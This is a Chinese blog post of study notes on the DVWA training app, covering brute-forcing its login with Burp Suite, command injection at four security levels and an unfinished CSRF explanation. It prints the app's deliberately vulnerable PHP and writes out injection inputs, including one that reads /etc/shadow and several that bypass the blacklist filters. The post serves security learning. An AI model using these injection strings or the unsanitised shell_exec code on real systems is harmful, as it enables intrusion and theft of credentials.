<!DOCTYPE html>
<html lang="zh-Hans">
    <!-- title -->




<!-- keywords -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
    <meta name="author" content="Mang0">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="Mang0">
    
    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content="一个想当摄影师的程序狗">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <title>DVWA笔记 · mang0&#39;s Blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href= "/assets/favicon1.ico" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
    <link rel="preload" href="/scripts/main.js" as="script" />
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >Mang0&#39;s Blog.</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">DVWA笔记</a>
            </div>
    </div>
    
    <a class="home-link" href=/>Mang0's Blog.</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/study.png)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            DVWA笔记
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "Dvwa">Dvwa</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count word-count">0</span>Reading time: <span class="post-count reading-time">1 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2017/11/22</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h1 id="DVWA笔记"><a href="#DVWA笔记" class="headerlink" title="DVWA笔记"></a>DVWA笔记</h1><h3 id="一：搭建平台"><a href="#一：搭建平台" class="headerlink" title="一：搭建平台"></a>一：搭建平台</h3><p> <img src="http://oy0tigw51.bkt.clouddn.com/201710232230_351.png" alt=""></p>
<p> <img src="http://oy0tigw51.bkt.clouddn.com/201710240131_802.png" alt="中文图"></p>
<hr>
<h3 id="二-Brute-Force"><a href="#二-Brute-Force" class="headerlink" title="二: Brute Force"></a>二: Brute Force</h3><p>Low:</p>
<pre><code>&lt;?php 

if( isset( $_GET[ &#39;Login&#39; ] ) ) { 
// Get username 
$user = $_GET[ &#39;username&#39; ]; 

// Get password 
$pass = $_GET[ &#39;password&#39; ]; 
$pass = md5( $pass ); 

// Check the database 
$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; 
$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { 
// Get users details 
$avatar = mysql_result( $result, 0, &quot;avatar&quot; ); 

// Login successful 
echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; 
echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; 
} 
else { 
// Login failed 
echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; 
} 
mysql_close(); 
} 
?&gt;
</code></pre><p>参数username、password没有做任何过滤，存在明显的sql注入漏洞。<br>在Login中输入用户名与密码<br>用burpsuite进行拦截<br><img src="http://oy0tigw51.bkt.clouddn.com/201710232240_813.png" alt=""></p>
<p>将表单进行提交到intruder模块，在password参数的内容两边加$，并将password设置为破解的payload<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240053_146.png" alt=""></p>
<p><img src="http://oy0tigw51.bkt.clouddn.com/201710240056_540.png" alt=""><br>尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。</p>
<p><img src="http://oy0tigw51.bkt.clouddn.com/201710240109_245.png" alt=""></p>
<p>Medium：</p>
<pre><code>&lt;?php 

if( isset( $_GET[ &#39;Login&#39; ] ) ) { 
// Sanitise username input 
$user = $_GET[ &#39;username&#39; ]; 
$user = mysql_real_escape_string( $user ); 

// Sanitise password input 
$pass = $_GET[ &#39;password&#39; ]; 
$pass = mysql_real_escape_string( $pass ); 
$pass = md5( $pass ); 

// Check the database 
$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; 
$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { 
// Get users details 
$avatar = mysql_result( $result, 0, &quot;avatar&quot; ); 

// Login successful 
echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; 
echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; 
} 
else { 
// Login failed 
sleep( 2 ); 
echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; 
} 

mysql_close(); 
} 

?&gt;
</code></pre><p>相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击(MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义)；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，源代码中只是添加了sleep函数，依然没有加入有效的防暴机制。</p>
<p>查看源码发现</p>
<p>sleep( 2 ); </p>
<pre><code>1
</code></pre><p>测试不成功时会延时2s，方法和low一样，只是慢一些，需要更新cookie中的安全等级security。</p>
<pre><code>headers = {
    &#39;Cookie&#39;: &#39;PHPSESSID=h6r8555q2obvo388r4u50lg397; security=medium&#39;
}
</code></pre><p>High：</p>
<pre><code>&lt;?php 

if( isset( $_GET[ &#39;Login&#39; ] ) ) { 
// Check Anti-CSRF token 
checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); 

// Sanitise username input 
$user = $_GET[ &#39;username&#39; ]; 
$user = stripslashes( $user ); 
$user = mysql_real_escape_string( $user ); 

// Sanitise password input 
$pass = $_GET[ &#39;password&#39; ]; 
$pass = stripslashes( $pass ); 
$pass = mysql_real_escape_string( $pass ); 
$pass = md5( $pass ); 

// Check database 
$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;
$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); 

if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { 
// Get users details 
$avatar = mysql_result( $result, 0, &quot;avatar&quot; ); 

// Login successful 
echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; 
echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; 
} 
else { 
// Login failed 
sleep( rand( 0, 3 ) ); 
echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; 
} 

mysql_close(); 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt; 
</code></pre><p>通过checkToken( $_REQUEST[ ‘user_token’ ], $_SESSION[ ‘session_token’ ], ‘index.php’ );加入token和generateSessionToken();加入Anti-CSRFtoken预防无脑爆破，所以我们不可以再使用burpsuite工具进行无脑爆破了。而且 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。<br>还是可以去进行暴力破解，这个就需要python脚本来完成了。通过浏览器访问，打开F12进行查看，我们会发现每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。同时，我们可以看到user_token在源代码中可以获取到的。所以我们需要写一个爬虫来获取页面中的user_token的值。</p>
<p>Impossible：</p>
<pre><code>&lt;?php 

if( isset( $_POST[ &#39;Login&#39; ] ) ) { 
// Check Anti-CSRF token 
checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); 

// Sanitise username input 
$user = $_POST[ &#39;username&#39; ]; 
$user = stripslashes( $user ); 
$user = mysql_real_escape_string( $user ); 

// Sanitise password input 
$pass = $_POST[ &#39;password&#39; ]; 
$pass = stripslashes( $pass ); 
$pass = mysql_real_escape_string( $pass ); 
$pass = md5( $pass ); 

// Default values 
$total_failed_login = 3; 
$lockout_time   = 15; 
$account_locked = false; 

// Check the database (Check user information) 
$data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; ); 
$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); 
$data-&gt;execute(); 
$row = $data-&gt;fetch(); 

// Check to see if the user has been locked out. 
if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) )  { 
// User locked out.  Note, using this method would allow for user enumeration! 
//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; 

// Calculate when the user would be allowed to login again 
$last_login = $row[ &#39;last_login&#39; ]; 
$last_login = strtotime( $last_login ); 
$timeout= strtotime( &quot;{$last_login} +{$lockout_time} minutes&quot; ); 
$timenow= strtotime( &quot;now&quot; ); 

// Check to see if enough time has passed, if it hasn&#39;t locked the account 
if( $timenow &gt; $timeout ) 
$account_locked = true; 
} 

// Check the database (if username matches the password) 
$data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); 
$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR); 
$data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR ); 
$data-&gt;execute(); 
$row = $data-&gt;fetch(); 

// If its a valid login... 
if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) { 
// Get users details 
$avatar   = $row[ &#39;avatar&#39; ]; 
$failed_login = $row[ &#39;failed_login&#39; ]; 
$last_login   = $row[ &#39;last_login&#39; ]; 

// Login successful 
echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;; 
echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; 

// Had the account been locked out since last login? 
if( $failed_login &gt;= $total_failed_login ) { 
echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; 
echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;; 
} 

// Reset bad login count 
$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; ); 
$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); 
$data-&gt;execute(); 
} 
else { 
// Login failed 
sleep( rand( 2, 4 ) ); 

// Give the user some feedback 
echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; 

// Update bad login count 
$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );
$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); 
$data-&gt;execute(); 
} 

// Set the last login time 
$data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; ); 
$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); 
$data-&gt;execute(); 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt;
</code></pre><p>Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。菜鸡发抖</p>
<hr>
<h3 id="三-Command-Injection"><a href="#三-Command-Injection" class="headerlink" title="三:Command Injection"></a>三:Command Injection</h3><p>命令注入漏洞是特别危险的，因为它们允许未经授权的执行操作系统命令， 它们的存在，因为应用程序无法正确地验证和消毒，使用时调用shell的功能，如的参数。 攻击者与控制这些参数可以欺骗应用程序执行任何系统命令自己的选择。为了正确测试命令注入漏洞，应遵循以下步骤：</p>
<ol>
<li>§ 第1步： 了解攻击场景</li>
<li>§ 第2步： 分析原因及对策</li>
<li>§ 第3步： 开始试验和探索</li>
<li><p>§ 第4步： 微调测试案例</p>
<p>命令注入攻击的常见模式为：仅仅需要输入数据的场合，却伴随着数据同时输入了恶意代码，而装载数据的系统对此并未设计良好的过滤过程，导致恶意代码也一并执行，最终导致信息泄露或者正常数据的破坏。<br>PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p>
</li>
</ol>
<pre><code>&lt;?php   

if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {   
// Get input   
$target = $_REQUEST[ &#39;ip&#39; ];   

// Determine OS and execute the ping command.   
if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {   
// Windows   
$cmd = shell_exec( &#39;ping  &#39; . $target );   
}   
else {   
// *nix   
$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );   
}   

// Feedback for the end user   
echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;   
}   

?&gt;
</code></pre><p>$target = $_REQUEST[ ‘ip’ ];直接从文本框中输入的内容，没有任何限制，刚刚我们在上面也看到了，在操作系统中使用“&amp;&amp;”连接符（在windows下一个&amp;和两个&amp;都可以，在linux下一定要两个），可以执行多条命令。</p>
<p>如果输入的值不是一个简单的IP，而是127.0.0.1&amp;&amp;net user，那么可以看到返回值里就把系统的用户名拿到了，<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240138_810.png" alt=""></p>
<p>还可以注意ping <a href="http://www.baidu.com.cn" target="_blank" rel="external">http://www.baidu.com.cn</a> || net user的写法，这句话的意思是如果||的前面命令执行失败则执行||后面的命令。<br>Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件，可见危害之大。</p>
<p>Medium：</p>
<pre><code>&lt;?php 

if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { 

// Get input 

$target = $_REQUEST[ &#39;ip&#39; ]; 

// Set blacklist 

$substitutions = array( 

&#39;&amp;&amp;&#39; =&gt; &#39;&#39;, 

&#39;;&#39;  =&gt; &#39;&#39;, 

); 

// Remove any of the charactars in the array (blacklist). 

$target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

// Determine OS and execute the ping command. 

if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { 

// Windows 

$cmd = shell_exec( &#39;ping  &#39; . $target ); 

} 

else { 

// *nix 

$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); 

} 

// Feedback for the end user 

echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 

} 

?&gt;
</code></pre><blockquote>
<p>// Set blacklist </p>
</blockquote>
<pre><code>$substitutions = array( 

    &#39;&amp;&amp;&#39; =&gt; &#39;&#39;, 

    &#39;;&#39;  =&gt; &#39;&#39;, 

); 

// Remove any of the charactars in the array (blacklist). 

$target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
</code></pre><p>相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;” 、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。<br>漏洞利用</p>
<p>127.0.0.1&amp;net user<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240149_886.png" alt=""></p>
<blockquote>
<p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p>
<p>Command 1&amp;&amp;Command 2</p>
<p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p>
<p>Command 1&amp;&amp;Command 2</p>
<p>Command 1&amp;Command 2</p>
<p>先执行Command 1，不管是否成功，都会执行Command 2</p>
</blockquote>
<p>2、由于使用的是str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：</p>
<p>127.0.0.1&amp;;&amp;ipconfig</p>
<p>127.0.0.1&amp;;&amp;ipconfig 绕过 </p>
<p>这是因为”127.0.0.1&amp;;&amp;ipconfig”中的” ;”会被替换为空字符，这样一来就变成了”127.0.0.1&amp;&amp; ipconfig” ，会成功执行。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240151_333.png" alt=""></p>
<p>High：</p>
<pre><code>&lt;?php 

if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { 

// Get input 

$target = trim($_REQUEST[ &#39;ip&#39; ]); 

// Set blacklist 

$substitutions = array( 

&#39;&amp;&#39;  =&gt; &#39;&#39;, 

&#39;;&#39;  =&gt; &#39;&#39;, 

&#39;|  &#39; =&gt; &#39;&#39;, 

&#39;-&#39;  =&gt; &#39;&#39;, 

&#39;$&#39;  =&gt; &#39;&#39;, 

&#39;(&#39;  =&gt; &#39;&#39;, 

&#39;)&#39;  =&gt; &#39;&#39;, 

&#39;`&#39;  =&gt; &#39;&#39;, 

&#39;||&#39; =&gt; &#39;&#39;, 

); 

// Remove any of the charactars in the array (blacklist). 

$target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

// Determine OS and execute the ping command. 

if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { 

// Windows 

$cmd = shell_exec( &#39;ping  &#39; . $target ); 

} 

else { 

// *nix 

$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); 

} 

// Feedback for the end user 

echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 

} 

?&gt;
</code></pre><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p>
<p>127.0.0.1|net user</p>
<p>127.0.0.1|net user 利用</p>
<p>Command 1 | Command 2</p>
<p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
<p>Impossible：</p>
<p>不存在命令注入漏洞</p>
<p><a href="http://www.4hou.com/technology/1012.html" target="_blank" rel="external">使用Metasploit对DVWA进行命令注入攻击</a></p>
<pre><code>&lt;?php 

if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { 

// Check Anti-CSRF token 

checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); 

// Get input 

$target = $_REQUEST[ &#39;ip&#39; ]; 

$target = stripslashes( $target ); 

// Split the IP into 4 octects 

$octet = explode( &quot;.&quot;, $target ); 

// Check IF each octet is an integer 

if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { 

// If all 4 octets are int&#39;s put the IP back together. 

$target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3]; 

// Determine OS and execute the ping command. 

if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { 

// Windows 

$cmd = shell_exec( &#39;ping  &#39; . $target ); 

} 

else { 

// *nix 

$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); 

} 

// Feedback for the end user 

echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 

} 

else { 

// Ops. Let the user name theres a mistake 

echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;; 

} 

} 

// Generate Anti-CSRF token 

generateSessionToken(); 

?&gt; 
</code></pre><h3 id="四：CSRF"><a href="#四：CSRF" class="headerlink" title="四：CSRF"></a>四：CSRF</h3><p>Cross-Site Request Forgery，跨站请求伪造，也称为One Click Attack，或者Session Riding。</p>
<p>是一种对网站的恶意利用。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。</p>
<p>XSS与之相反，XSS利用站点内的信任用户进行攻击。</p>
<p>举个例子</p>
<p>下面这幅图片应该比较形象了，用户浏览器在不知情的情况下访问了A网站。并且A网站是可以正常访问的，因为Cookie并没有失效。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240200_145.jpg" alt=""><br>再举个实际中可能发生的例子</p>
<p>一个网站用户Bob可能正在浏览聊天论坛，而同时另一个用户Alice也在此论坛中，并且后者刚刚发布了一个具有Bob银行链接的图片消息。设想一下，Alice编写了一个在Bob的银行站点上进行取款的form提交的链接，并将此链接作为图片tag。如果Bob的银行在cookie中保存他的授权信息，并且此cookie没有过期，那么当Bob的浏览器尝试装载图片时将提交这个取款form和他的cookie，这样在没经Bob同意的情况下便授权了这次事务。</p>
